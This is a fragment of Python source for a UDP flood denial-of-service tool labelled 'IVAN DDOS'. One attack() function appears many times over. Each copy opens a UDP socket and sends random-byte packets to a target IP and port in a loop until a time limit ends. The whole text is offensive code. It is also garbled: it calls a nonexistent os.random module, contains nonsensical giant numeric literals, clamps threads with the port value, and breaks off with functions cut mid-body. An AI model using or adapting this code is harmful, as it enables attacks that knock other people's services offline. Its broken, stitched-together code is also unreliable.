        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
